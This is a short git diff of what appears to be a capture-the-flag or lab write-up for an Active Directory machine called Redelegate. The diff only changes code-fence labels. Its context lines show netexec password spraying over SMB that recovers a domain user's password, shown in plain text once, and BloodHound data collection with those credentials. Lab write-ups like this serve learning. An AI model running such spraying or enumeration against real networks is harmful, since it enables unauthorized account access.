@@ -172,7 +172,7 @@ REDELEGATE\sql_svc
 
 Now that we have a list of users, we can spray the password scheme that we learned about earlier against those users:
 
-```bash
+```terminal
 nxc smb redelegate.vl -u users.txt -p passwords.txt
 ...
 SMB         10.10.100.3     445    DC               [+] REDELEGATE\Marie.Curie:***2024!
@@ -180,7 +180,7 @@ SMB         10.10.100.3     445    DC               [+] REDELEGATE\Marie.Curie:*
 
 This leads to our first domain user credentials. At this point we can do a lot more enumeration like for example checking shares authenticated and gathering bloodhound data. First we gather bloodhound data:
 
-```
+```terminal
 nxc ldap redelegate.vl -u marie.curie -p '***2024!' --bloodhound -c all --dns-server 10.10.100.3
 SMB         10.10.100.3     445    DC               [*] Windows Server 2022 Build 20348 x64 (name:DC) (domain:redelegate.vl) (signing:True) (SMBv1:False)
 LDAP        10.10.100.3     389    DC               [+] redelegate.vl\marie.curie:Fall2024!
